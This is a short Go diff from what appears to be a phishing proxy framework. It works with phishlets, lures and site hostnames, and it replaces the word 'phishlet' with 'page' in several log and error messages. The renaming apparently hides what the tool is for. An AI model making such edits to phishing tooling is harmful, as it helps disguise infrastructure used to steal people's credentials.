@@ -170,7 +170,7 @@ func (c *Config) SetSiteHostname(site string, domain string) bool {
 		return false
 	}
 	if domain != c.baseDomain && !strings.HasSuffix(domain, "."+c.baseDomain) {
-		log.Error("phishlet hostname must end with '%s'", c.baseDomain)
+		log.Error("page hostname must end with '%s'", c.baseDomain)
 		return false
 	}
 	c.siteDomains[site] = domain
@@ -270,7 +270,7 @@ func (c *Config) SetSiteEnabled(site string) error {
 		sites = append(sites, s)
 	}
 	c.cfg.Set(CFG_SITES_ENABLED, sites)
-	log.Info("enabled phishlet '%s'", site)
+	log.Info("enabled page '%s'", site)
 	c.cfg.WriteConfig()
 	return nil
 }
@@ -289,7 +289,7 @@ func (c *Config) SetSiteDisabled(site string) error {
 		sites = append(sites, s)
 	}
 	c.cfg.Set(CFG_SITES_ENABLED, sites)
-	log.Info("disabled phishlet '%s'", site)
+	log.Info("disabled page '%s'", site)
 	c.cfg.WriteConfig()
 	return nil
 }
@@ -315,9 +315,9 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 	}
 	c.cfg.Set(CFG_SITES_HIDDEN, sites)
 	if hide {
-		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
+		log.Info("page '%s' is now hidden and all requests to it will be redirected", site)
 	} else {
-		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
+		log.Info("page '%s' is now reachable and visible from the outside", site)
 	}
 	c.cfg.WriteConfig()
 	return nil
@@ -505,7 +505,7 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
 	pl, ok := c.phishlets[site]
 	if !ok {
-		return nil, fmt.Errorf("phishlet '%s' not found", site)
+		return nil, fmt.Errorf("page '%s' not found", site)
 	}
 	return pl, nil
 }
